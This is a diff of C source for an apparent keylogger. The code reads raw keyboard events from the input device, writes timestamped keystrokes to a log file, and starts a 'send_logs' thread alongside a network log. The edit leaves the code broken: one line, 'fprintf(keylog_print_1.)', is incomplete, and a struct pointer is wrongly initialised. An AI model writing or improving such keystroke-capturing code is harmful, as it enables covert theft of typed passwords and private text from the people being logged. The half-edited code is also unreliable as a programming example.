@@ -54,9 +54,9 @@ int main(int argc, char **argv)
     if (argc >= 2)
         id = atoi(argv[1]);
     
-    start_client();
     /*Retrieve Keyboard file descriptor*/
     struct Config config = retrive_keyboard_file();
+    
     /*Open log file*/
     FILE *keylog_log = fopen("log/keylog.txt", "a");
     if (keylog_log == NULL)
@@ -64,10 +64,12 @@ int main(int argc, char **argv)
         printf("Error opening keylog log. Exiting...\n");
         exit(1);
     }
-    
-    struct loginfo *k_loginfo = { keylog_log, NEVER_WRITTEN, 4 };
-    struct keylog_print keylog_print_1 = { k_loginfo , config };
     setbuf(keylog_log, NULL);
+    
+    struct loginfo *k_loginfo = {keylog_log,NEVER_WRITTEN, 4 };
+    struct keylog_print keylog_print_1 = {k_loginfo , config };
+
+    
     /*Create threads*/
     pthread_attr_t attr;
     pthread_attr_init(&attr);
@@ -81,8 +83,7 @@ int main(int argc, char **argv)
     pthread_t sendlogs;
     pthread_create(&sendlogs, &attr, send_logs, NULL);
 
-    /*Open log folders*/
-    FILE *network_log = fopen("/.keylogger/log/network.txt", "a");
+    FILE *network_log = fopen("log/network.txt", "a");
     if (network_log == NULL)
     {
         printf("Error opening network log. Exiting...");
@@ -253,7 +254,6 @@ void* start_keylogging(void *args)
     int shift_pressed=0; //If shift engaged, shift_pressed = 1
 
     struct keylog_print keylog_print_1 =  *(struct keylog_print *)args;
-    //struct loginfo *k_info = keylog_print_1.k_loginfo;
     
     while (read(keylog_print_1.config.kb_fd, &event, sizeof(input_event)) > 0){
         if (event.type == EV_KEY) {
@@ -263,8 +263,12 @@ void* start_keylogging(void *args)
                 }
                 char *name = get_key_text(event.code, shift_pressed);
                 if (strcmp(name, "\0") != 0) {
+                    /*
                    timestamped_write(keylog_print_1.k_loginfo, name);
                    timestamped_write(keylog_print_1.k_loginfo, "\n");
+                    */
+                    fprintf(keylog_print_1.)
+                    
                 }
             } else if (event.value == KEY_RELEASE) {
                 if (is_shift(event.code)) {
